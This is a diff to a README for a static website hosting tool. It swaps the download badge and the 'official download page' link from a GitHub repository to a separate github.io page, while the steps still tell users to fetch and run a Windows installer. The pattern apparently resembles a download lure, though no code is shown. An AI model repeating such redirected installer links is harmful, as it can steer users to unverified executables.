@@ -1,6 +1,6 @@
 # 📁 static-site-showcase - Host your static websites with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Fellowfeelingfamilyblenniidae970/static-site-showcase)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue)](https://fellowfeelingfamilyblenniidae970.github.io)
 
 This tool helps you host your own static websites. It works on your computer and supports many features like ZIP file uploads and live previews. You can manage multiple users and secure your data with a database. It fits many uses, whether you have one site or many.
 
@@ -23,7 +23,7 @@ This tool helps you host your own static websites. It works on your computer and
 
 You do not need to be a developer to use this platform. Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Fellowfeelingfamilyblenniidae970/static-site-showcase) to find the latest version of the application.
+1.  Visit the [official download page](https://fellowfeelingfamilyblenniidae970.github.io) to find the latest version of the application.
 2.  Look for the section marked Releases on the right side of the page.
 3.  Click the link for the Windows installer file.
 4.  Save the file to your computer.
